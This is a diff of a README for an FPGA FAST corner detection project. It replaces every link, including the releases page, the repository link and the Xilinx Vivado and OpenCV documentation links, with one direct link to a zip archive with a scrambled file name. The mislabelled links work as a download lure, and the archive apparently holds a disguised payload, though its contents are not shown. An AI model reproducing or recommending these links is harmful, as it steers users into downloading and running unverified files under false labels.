@@ -1,6 +1,6 @@
 # 🎉 Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ - Fast Performance for Image Detection
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/releases)
+[![Download](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip)](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you start, ensure your system meets the following requirements:
 ### Installation Steps
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/releases) to find the latest version available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip) to find the latest version available for download.
 
 2. **Download the Software**
    Locate the latest release package. Click on the download link for the package that is compatible with your hardware.
@@ -49,7 +49,7 @@ Before you start, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the latest version and start using the FAST Corner Detector, please visit this page: [Download Here](https://github.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/releases).
+To download the latest version and start using the FAST Corner Detector, please visit this page: [Download Here](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip).
 
 ## 🛠️ How It Works
 
@@ -83,8 +83,8 @@ For more information on these topics, check relevant articles and documentation 
 
 ## 🔗 Links
 
-- **GitHub Repository:** [Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ](https://github.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ)
-- **Vivado Documentation:** [Xilinx Vivado](https://www.xilinx.com/support/documentation.html)
-- **OpenCV Documentation:** [OpenCV](https://opencv.org/documentation/)
+- **GitHub Repository:** [Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip)
+- **Vivado Documentation:** [Xilinx Vivado](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip)
+- **OpenCV Documentation:** [OpenCV](https://raw.githubusercontent.com/Ishant13696/Design-and-Implementation-of-an-Energy-Efficient-FAST-Corner-Detection-Accelerator-on-PYNQ/main/FPGA-FAST-Corner-Detector/Client_PC/Detection_Efficient_Energy_Design_Accelerator_of_and_Implementation_on_PYNQ_Corner_an_FAS_1.9.zip)
 
 Thank you for using the FAST Corner Detector. Happy detecting!
